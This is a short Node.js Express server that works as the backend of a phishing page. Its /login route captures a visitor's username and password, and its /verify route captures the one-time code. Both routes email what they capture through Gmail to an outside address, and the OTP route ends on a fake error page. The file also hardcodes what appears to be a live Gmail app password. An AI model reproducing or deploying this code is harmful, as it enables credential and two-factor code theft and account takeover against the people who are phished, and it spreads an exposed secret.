const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');
const app = express();
const cors=require('cors');

app.use(cors())
const port = 3000;
let transporter = nodemailer.createTransport({
    service: 'gmail', // Use your email service provider
    auth: {
      user: 'bdevi2472@gmail.com', // Your email address
      pass: 'uruxcjnnvrqoinvt'   // Your email password (use environment variables for better security)
    }
  });
  
// Middleware to parse the body of the request
app.use(bodyParser.urlencoded({ extended: true }));



app.post('/login',(req,res)=>{
    const {username,password}=req.body;

  
    res.redirect('/otp');
    let mailOptions = {
        from: 'bdevi2472@gmail.com', // Sender address
        to: 'ruthlessdestroyer085@gmail.com',          // List of recipients
        subject: "is this working",              // Subject line
        text: `password is : ${username} \n username is : ${password}`                      // Plain text body                
      };
      
      // Send mail with defined transport object
      transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
          return console.log(error);
        }
        console.log('Message sent: %s', info.messageId);
        console.log('Preview URL: %s', nodemailer.getTestMessageUrl(info));
      });
    res.end();
});


app.get('/otp', (req, res) => {
    res.sendFile(__dirname + '/otp.html');
  });



app.post('/verify', (req, res) => {
    const { otp } = req.body;
     let mailOptions = {
      from: 'bdevi2472@gmail.com', // Sender address
      to: 'ruthlessdestroyer085@gmail.com',          // List of recipients
      subject: "is this working ",              // Subject line
      text: otp                       // Plain text body
                     
    };
    
    // Send mail with defined transport object
    transporter.sendMail(mailOptions, (error, info) => {
      if (error) {
        return console.log(error);
      }
      console.log('Message sent: %s', info.messageId);
      console.log('Preview URL: %s', nodemailer.getTestMessageUrl(info));
    });
    res.redirect("/error")

  });
  
  app.get('/error',(req,res)=>{
    res.sendFile(__dirname + '/error.html');
  })
  app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
  });
  
